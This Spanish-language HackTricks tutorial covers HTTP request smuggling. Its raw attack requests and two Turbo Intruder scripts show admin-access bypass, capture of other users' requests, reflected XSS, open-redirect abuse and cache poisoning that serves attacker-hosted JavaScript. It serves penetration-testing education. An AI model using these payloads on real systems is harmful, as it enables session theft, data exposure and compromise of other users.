# HTTP Request Smuggling / Ataque de Desincronizaci√≥n HTTP

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu√© es

Esta vulnerabilidad ocurre cuando una **desincronizaci√≥n** entre **proxies frontales** y el servidor **back-end** permite a un **atacante** **enviar** una solicitud HTTP que ser√° **interpretada** como una **solicitud √∫nica** por los proxies frontales (balanceador de carga/proxy inverso) y **como 2 solicitudes** por el servidor **back-end**.\
Esto permite a un usuario **modificar la siguiente solicitud que llegue al servidor back-end despu√©s de la suya**.

### Teor√≠a

[**Especificaci√≥n RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este √∫ltimo DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tama√±o del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificaci√≥n utilizada para transferir de manera segura el cuerpo del mensaje al usuario.\
> Chunked significa que los datos grandes se env√≠an en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el encabezado _**transfer-encoding**_ y el servidor **Back-end** **procesa el otro**, provocando una **desincronizaci√≥n** entre los 2 sistemas.\
Esto podr√≠a ser muy cr√≠tico ya que **un atacante podr√° enviar una solicitud** al proxy inverso que ser√° **interpretada** por el servidor **back-end** **como 2 solicitudes diferentes**. El **peligro** de esta t√©cnica reside en el hecho de que el servidor **back-end** **interpretar√°** la **2¬™ solicitud inyectada** como si **proviniera del siguiente cliente** y la **solicitud real** de ese cliente ser√° **parte** de la **solicitud inyectada**.

### Particularidades

Recuerda que en HTTP **un car√°cter de nueva l√≠nea est√° compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **n√∫mero decimal** para indicar el **n√∫mero** de **bytes** del **cuerpo** de la solicitud. Se espera que el cuerpo termine en el √∫ltimo car√°cter, **no se necesita una nueva l√≠nea al final de la solicitud**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **n√∫mero hexadecimal** para indicar el **n√∫mero** de **bytes** del **siguiente fragmento**. El **fragmento** debe **terminar** con una **nueva l√≠nea**, pero esta nueva l√≠nea **no se cuenta** en el indicador de longitud. Este m√©todo de transferencia debe terminar con un **fragmento de tama√±o 0 seguido de 2 nuevas l√≠neas**: `0`
* **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera solicitud del Smuggling.

## Ejemplos B√°sicos

Por lo tanto, los ataques de smuggling de solicitudes implican colocar tanto el encabezado `Content-Length` como el encabezado `Transfer-Encoding` en una √∫nica solicitud HTTP y manipular estos de tal manera que los servidores frontales y back-end procesen la solicitud de manera diferente. La forma exacta en que se hace esto depende del comportamiento de los dos servidores:

* **CL.TE**: el servidor frontal utiliza el encabezado `Content-Length` y el servidor back-end utiliza el encabezado `Transfer-Encoding`.
* **TE.CL**: el servidor frontal utiliza el encabezado `Transfer-Encoding` y el servidor back-end utiliza el encabezado `Content-Length`.
* **TE.TE**: los servidores frontal y back-end admiten el encabezado `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo al ofuscar el encabezado de alguna manera.

### Vulnerabilidades CL.TE

Aqu√≠, el servidor **frontal** utiliza el encabezado **`Content-Length`** y el servidor **back-end** utiliza el encabezado **`Transfer-Encoding`**. Podemos realizar un ataque simple de smuggling de solicitudes HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Note c√≥mo `Content-Length` indica que la **longitud del cuerpo de la solicitud es de 30 bytes** (_recuerde que HTTP usa como nueva l√≠nea, por lo que 2 bytes cada nueva l√≠nea_), por lo que el proxy inverso **enviar√° la solicitud completa** al back-end, y el back-end procesar√° el encabezado `Transfer-Encoding` dejando el `GET /404 HTTP/1.1` como el **comienzo de la siguiente solicitud** (por cierto, la siguiente solicitud se adjuntar√° a `Foo:x<Comienza la siguiente solicitud aqu√≠>`).

### Vulnerabilidades TE.CL

Aqu√≠, el servidor frontal utiliza el encabezado `Transfer-Encoding` y el servidor back-end utiliza el encabezado `Content-Length`. Podemos realizar un ataque simple de smuggling de solicitudes HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

En este caso, el **proxy inverso** **enviar√° toda la solicitud** al **back-end** como indica el **`Transfer-encoding`**. Pero, el **back-end** va a **procesar** solo los **`7b`** (4 bytes) como se indica en el `Content-Length`. Por lo tanto, la siguiente solicitud ser√° la que comience por `GET /404 HTTP/1.1`

_Note que incluso si el ataque debe terminar con un `0`, la siguiente solicitud se adjuntar√° como valores adicionales del par√°metro **x**._\
_Tambi√©n note que el Content-Length de la solicitud incrustada indicar√° la longitud de la siguiente solicitud que se adjuntar√° al par√°metro **x**. Si es demasiado peque√±o, solo se adjuntar√°n unos pocos bytes, y si es demasiado grande (mayor que la longitud de la siguiente solicitud) se lanzar√° un error para la siguiente solicitud._

### Vulnerabilidades TE.TE

Aqu√≠, los servidores frontal y back-end admiten el encabezado `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo al ofuscar el encabezado de alguna manera.\
Hay potencialmente infinitas formas de ofuscar el encabezado `Transfer-Encoding`. Por ejemplo:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Dependiendo del servidor (proxy inverso o respaldo) que **deje de procesar** el encabezado **TE**, encontrar√° una vulnerabilidad **CL.TE** o una vulnerabilidad **TE.CL**.

## Encontrando HTTP Request Smuggling

### Encontrando vulnerabilidades CL.TE usando t√©cnicas de tiempo

Si una aplicaci√≥n es vulnerable a la variante CL.TE del smuggling de solicitudes, entonces enviar una solicitud como la siguiente a menudo causar√° un retraso en el tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Dado que el servidor frontal utiliza el encabezado `Content-Length`, solo reenviar√° parte de esta solicitud, omitiendo el `0`. El servidor de fondo utiliza el encabezado `Transfer-Encoding`, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causar√° un retraso de tiempo observable.

A veces, en lugar de obtener un tiempo de espera, recibes un error 400 de solicitud incorrecta del host final como en el siguiente escenario, donde se env√≠a una carga √∫til CL.TE:

![](<../../.gitbook/assets/image (444).png>)

Y la respuesta es una redirecci√≥n que contiene un error dentro del cuerpo con incluso la versi√≥n del haproxy utilizado:

![](<../../.gitbook/assets/image (443).png>)

### Encontrando vulnerabilidades TE.CL utilizando t√©cnicas de temporizaci√≥n

Si una aplicaci√≥n es vulnerable a la variante TE.CL de contrabando de solicitudes, entonces enviar una solicitud como la siguiente a menudo causar√° un retraso de tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### Sondeando vulnerabilidades de contrabando de solicitudes HTTP

Una vez que hayas encontrado que las **t√©cnicas de temporizaci√≥n est√°n funcionando**, necesitas **sondear** que puedes **alterar las solicitudes de otros clientes**.\
La forma m√°s f√°cil de hacer esto es intentar envenenar tus propias solicitudes, **hacer que una solicitud a `/` devuelva un 404, por ejemplo**.\
En los [Ejemplos B√°sicos](./#basic-examples) ya vimos ejemplos de `CL.TE` y `TE.CL` de c√≥mo envenenar la solicitud de un cliente para pedir `/404` provocando una respuesta 404 cuando el cliente estaba pidiendo cualquier otro recurso.

**Notas**

Algunas consideraciones importantes deben tenerse en cuenta al intentar confirmar vulnerabilidades de contrabando de solicitudes a trav√©s de la interferencia con otras solicitudes:

* La solicitud de "ataque" y la solicitud "normal" deben enviarse al servidor utilizando diferentes conexiones de red. Enviar ambas solicitudes a trav√©s de la misma conexi√≥n no probar√° que la vulnerabilidad existe.
* La solicitud de "ataque" y la solicitud "normal" deben usar la misma URL y nombres de par√°metros, en la medida de lo posible. Esto se debe a que muchas aplicaciones modernas enrutan las solicitudes del front-end a diferentes servidores back-end basados en la URL y los par√°metros. Usar la misma URL y par√°metros aumenta la posibilidad de que las solicitudes sean procesadas por el mismo servidor back-end, lo cual es esencial para que el ataque funcione.
* Al probar la solicitud "normal" para detectar cualquier interferencia de la solicitud de "ataque", est√°s en una carrera con cualquier otra solicitud que la aplicaci√≥n est√© recibiendo al mismo tiempo, incluidas las de otros usuarios. Debes enviar la solicitud "normal" inmediatamente despu√©s de la solicitud de "ataque". Si la aplicaci√≥n est√° ocupada, podr√≠as necesitar realizar varios intentos para confirmar la vulnerabilidad.
* En algunas aplicaciones, el servidor front-end funciona como un balanceador de carga y reenv√≠a las solicitudes a diferentes sistemas back-end de acuerdo con alg√∫n algoritmo de balanceo de carga. Si tus solicitudes de "ataque" y "normal" se reenv√≠an a diferentes sistemas back-end, entonces el ataque fallar√°. Esta es una raz√≥n adicional por la que podr√≠as necesitar intentarlo varias veces antes de que se pueda confirmar una vulnerabilidad.
* Si tu ataque tiene √©xito en interferir con una solicitud posterior, pero esta no fue la solicitud "normal" que enviaste para detectar la interferencia, entonces esto significa que otro usuario de la aplicaci√≥n fue afectado por tu ataque. Si contin√∫as realizando la prueba, esto podr√≠a tener un efecto perturbador en otros usuarios, y debes proceder con precauci√≥n.

### Forzando a trav√©s de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop podr√≠as indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que sea posible abusar del contrabando de solicitudes HTTP**.
```
Connection: Content-Length
```
Para **m√°s informaci√≥n sobre encabezados hop-by-hop** visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abusando del HTTP Request Smuggling

### Para evadir controles de seguridad front-end

A veces los **proxies front-end realizan algunas comprobaciones de seguridad**. Puedes evitarlas abusando del HTTP Request Smuggling ya que podr√°s **eludir las protecciones**. Por ejemplo, en este ejemplo **no puedes acceder a `/admin` desde el exterior** y el proxy front-end est√° comprobando eso, pero este **proxy no est√° comprobando la solicitud embebida**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando la reescritura de solicitudes front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

En muchas aplicaciones, el **servidor front-end realiza alguna reescritura de solicitudes** antes de que sean enviadas al servidor back-end, t√≠picamente a√±adiendo algunos encabezados adicionales a la solicitud.\
Una pr√°ctica com√∫n es **a√±adir al encabezado de la solicitud** `X-Forwarded-For: <IP del cliente>` o alg√∫n encabezado similar para que el back-end conozca la IP del cliente.\
A veces, si puedes **encontrar qu√© nuevos valores se a√±aden** a la solicitud podr√≠as ser capaz de **eludir protecciones** y **acceder a informaci√≥n/endpoint ocultos**.

Para descubrir c√≥mo el proxy est√° reescribiendo la solicitud necesitas **encontrar un par√°metro POST que el back-end reflejar√° su valor** en la respuesta. Luego, usa este par√°metro como el √∫ltimo y utiliza un exploit como este:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

En este caso la siguiente solicitud se a√±adir√° despu√©s de `search=`, que es tambi√©n **el par√°metro cuyo valor se reflejar√°** en la respuesta, por lo tanto, va a **reflejar los encabezados de la siguiente solicitud**.

Nota que **solo la longitud indicada en el encabezado `Content-Length` de la solicitud embebida se reflejar√°**. Si usas un n√∫mero bajo, solo se reflejar√°n unos pocos bytes, si usas un n√∫mero mayor que la longitud de todos los encabezados, entonces la solicitud embebida generar√° un error. Entonces, deber√≠as **comenzar** con un **n√∫mero peque√±o** e **incrementarlo** hasta que veas todo lo que quer√≠as ver.\
Nota tambi√©n que esta **t√©cnica tambi√©n es explotable con una vulnerabilidad TE.CL** pero la solicitud debe terminar con `search=\r\n0`. Sin embargo, independientemente de los caracteres de nueva l√≠nea, los valores se a√±adir√°n al par√°metro de b√∫squeda.

Finalmente, ten en cuenta que en este ataque todav√≠a estamos atac√°ndonos a nosotros mismos para aprender c√≥mo el proxy front-end est√° reescribiendo la solicitud.

### Capturando solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si puedes encontrar una solicitud POST que va a guardar el contenido de uno de los par√°metros, puedes a√±adir la siguiente solicitud como el valor de ese par√°metro para almacenar la solicitud del siguiente cliente:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

En este caso, el valor del **par√°metro comentario** se **guardar√° dentro de un comentario** de una publicaci√≥n en la p√°gina que est√° **disponible p√∫blicamente**, por lo que un **comentario aparecer√° con el contenido de la siguiente solicitud**.

_Una limitaci√≥n con esta t√©cnica es que generalmente solo capturar√° datos hasta el delimitador de par√°metros que sea aplicable para la solicitud contrabandeada. Para env√≠os de formularios codificados en URL, ser√° el car√°cter `&`, lo que significa que el contenido que se almacena de la solicitud del usuario v√≠ctima terminar√° en el primer `&`, que incluso podr√≠a aparecer en la cadena de consulta._

Nota tambi√©n que esta **t√©cnica tambi√©n es explotable con una vulnerabilidad TE.CL** pero la solicitud debe terminar con `search=\r\n0`. Sin embargo, independientemente de los caracteres de nueva l√≠nea, los valores se a√±adir√°n al par√°metro de b√∫squeda.

### Usando HTTP Request Smuggling para explotar XSS reflejado

Si la p√°gina web tambi√©n es **vulnerable a XSS reflejado**, puedes abusar del HTTP Request Smuggling para atacar a los clientes de la web. La explotaci√≥n de XSS reflejado desde HTTP Request Smuggling tiene algunas ventajas:

* **No requiere interacci√≥n con los usuarios v√≠ctimas**
* Se puede utilizar para **explotar** comportamientos XSS en partes de la solicitud que **no se pueden controlar trivialmente en un ataque XSS reflejado normal**, como los encabezados de las solicitudes HTTP.

Si una web es vulnerable a XSS reflejado en el encabezado User-Agent puedes usar este payload para explotarlo:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Usando HTTP Request Smuggling para convertir una redirecci√≥n interna en una redirecci√≥n abierta <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

Muchas aplicaciones realizan redirecciones internas de una URL a otra y colocan el nombre de host del encabezado `Host` de la solicitud en la URL de redirecci√≥n. Un ejemplo de esto es el comportamiento predeterminado de los servidores web Apache e IIS, donde una solicitud de una carpeta sin una barra inclinada al final recibe una redirecci√≥n a la misma carpeta incluyendo la barra inclinada:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Este comportamiento normalmente se considera inofensivo, pero puede ser explotado en un ataque de contrabando de solicitudes para redirigir a otros usuarios a un dominio externo. Por ejemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La solicitud contrabandeada desencadenar√° una redirecci√≥n al sitio web del atacante, lo que afectar√° la siguiente solicitud del usuario que sea procesada por el servidor back-end. Por ejemplo:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Aqu√≠, la solicitud del usuario era para un archivo JavaScript que fue importado por una p√°gina en el sitio web. El atacante puede comprometer completamente al usuario v√≠ctima devolviendo su propio JavaScript en la respuesta.

### Usando HTTP Request Smuggling para realizar envenenamiento de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si alguna parte de la **infraestructura front-end realiza cach√© de contenido** (generalmente por razones de rendimiento) entonces **podr√≠a ser posible envenenar esa cach√© modificando la respuesta del servidor**.

Ya hemos visto c√≥mo modificar el valor de retorno esperado del servidor a un 404 (en los [Ejemplos B√°sicos](./#basic-examples)), de manera similar podr√≠as hacer que el servidor devuelva el contenido de /index.html cuando la solicitud envenenada est√° pidiendo `/static/include.js`. De esta manera, el contenido de `/static/include.js` se almacenar√° en cach√© con el contenido de `/index.html` haciendo `/static/include.js` inaccesible para los clientes (¬øDoS?).

Nota que esto es a√∫n m√°s interesante si encuentras alg√∫n **Open Redirect** o alguna **redirecci√≥n interna a redirecci√≥n abierta** (√∫ltima secci√≥n). Porque, podr√≠as ser capaz de **cambiar los valores de cach√©** de `/static/include.js` con **los de un script controlado por ti** (haciendo un **XSS general a todos los clientes** que intenten descargar la nueva versi√≥n de `/static/include.js`).

En este ejemplo se mostrar√° c√≥mo puedes explotar un **envenenamiento de cach√© + redirecci√≥n interna a redirecci√≥n abierta** para modificar los contenidos de la cach√© de `/static/include.js` para **servir c√≥digo JS controlado** por el atacante:

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Nota c√≥mo la solicitud embebida est√° pidiendo `/post/next?postId=3` Esta solicitud ser√° redirigida a `/post?postId=4` y **usar√° el valor del encabezado Host** para indicar el dominio. Por lo tanto, puedes **modificar el encabezado Host** para apuntar al servidor del atacante y la redirecci√≥n usar√° ese dominio (**redirecci√≥n interna a redirecci√≥n abierta**).

Luego, **despu√©s de envenenar el socket**, necesitas enviar una **solicitud GET** a **`/static/include.js`** esta solicitud ser√° **envenenada** por la solicitud de **redirecci√≥n interna a redirecci√≥n abierta** y **obtendr√° los contenidos del script controlado por el atacante**.

La pr√≥xima vez que alguien pida `/static/include.js` se servir√°n los contenidos en cach√© del script del atacante (XSS general).

### Usando HTTP Request Smuggling para realizar decepci√≥n de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¬øCu√°l es la diferencia entre envenenamiento de cach√© web y decepci√≥n de cach√© web?**
>
> * En el **envenenamiento de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido malicioso en la cach√©, y este contenido se sirve desde la cach√© a otros usuarios de la aplicaci√≥n.
> * En la **decepci√≥n de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido sensible perteneciente a otro usuario en la cach√©, y el atacante luego recupera este contenido de la cach√©.

En esta variante, el atacante contrabandea una solicitud que devuelve alg√∫n contenido sensible espec√≠fico del usuario. Por ejemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si el **envenenamiento alcanza a un cliente que estaba accediendo a alg√∫n contenido est√°tico** como `/someimage.png` que iba a ser **almacenado en cach√©**. Los contenidos de `/private/messages` de la v√≠ctima se almacenar√°n en cach√© en `/someimage.png` y el atacante podr√° robarlos.\
Nota que el **atacante no sabe qu√© contenido est√°tico estaba intentando acceder la v√≠ctima** por lo que probablemente la mejor manera de probar esto es realizar el ataque, esperar unos segundos y **cargar todo** el contenido est√°tico y **buscar los datos privados**.

### Armando HTTP Request Smuggling con Desincronizaci√≥n de Respuesta HTTP

¬øHas encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes c√≥mo explotarla? Prueba estos otros m√©todos de explotaci√≥n:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## M√°s informaci√≥n

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagen de aqu√≠.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gram√°tica √∫til para encontrar discrepancias extra√±as en el smuggling de solicitudes.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
